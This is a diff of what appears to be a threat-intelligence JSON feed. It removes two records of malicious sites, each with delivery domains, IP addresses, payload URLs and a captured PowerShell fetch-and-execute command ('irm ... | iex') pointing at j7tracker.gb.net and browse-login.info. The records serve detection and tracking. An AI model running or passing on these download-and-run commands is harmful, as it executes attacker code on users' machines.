@@ -1882,50 +1882,5 @@
     ],
     "ReportId": "cmwwopgeq054d0omllcs61sbn",
     "ScannedAt": "2026-11-25T22:17:40.726000+00:00"
-  },
-  {
-    "UrlDomain": "promptsymbiotic.com",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/Girya/c0f2f5011d866ebe"
-    ],
-    "IP": [
-      "194.135.86.20"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/Girya/c0f2f5011d866ebe')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/Girya/c0f2f5011d866ebe"
-    ],
-    "ReportId": "cmwwngngx042q0omlpb0jlhda",
-    "ScannedAt": "2026-11-25T21:42:50.380000+00:00"
-  },
-  {
-    "UrlDomain": "global1world.com",
-    "DeliveryUrl": [
-      "browse-login.info"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "93.127.179.176"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-login.info/eeab68657283de12",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-login.info/api.php?s=05eba1c31d40ace2c6cfb4801839c576e960a14858198764&amp;_v=29927371",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-login[.]info/eeab68657283de12'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-login.info/eeab68657283de12"
-    ],
-    "ReportId": "cmwwn25ka03pc0omlux7vhsdw",
-    "ScannedAt": "2026-11-25T21:31:33.950000+00:00"
   }
 ]
